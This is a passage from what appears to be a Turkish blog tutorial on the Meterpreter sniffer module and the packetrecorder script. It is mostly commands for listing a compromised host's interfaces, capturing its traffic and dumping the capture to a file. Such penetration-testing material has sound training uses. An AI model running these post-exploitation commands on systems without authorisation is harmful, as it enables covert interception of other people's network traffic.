...
<h2 class="wp-block-heading" id="sinffer-modülünü-yükleyelim">Sinffer Modülünü Yükleyelim
<!-- /wp:heading -->
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  use sniffer
...
<h2 class="wp-block-heading" id="dinlenebilir-arayüzler">Dinlenebilir Arayüzler
<!-- /wp:heading -->
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  sniffer_interfaces
...
<h2 class="wp-block-heading" id="dinlemeye-başlama">Dinlemeye Başlama
<!-- /wp:heading -->
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  sniffer_start 1
***[*** ******* ***]***  Capture started on interface 1 ***(*** 200000 packet buffer***)*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="kayıtları-kontrol-etme">Kayıtları Kontrol Etme
<!-- /wp:heading -->
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  sniffer_dump 1 /tmp/all.cap
...
<h2 class="wp-block-heading" id="packetrecorder-eklentisi">packetrecorder Eklentisi
<!-- /wp:heading -->
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run packetrecorder 
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run packetrecorder -li
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run packetrecorder -i 2 -l /root/
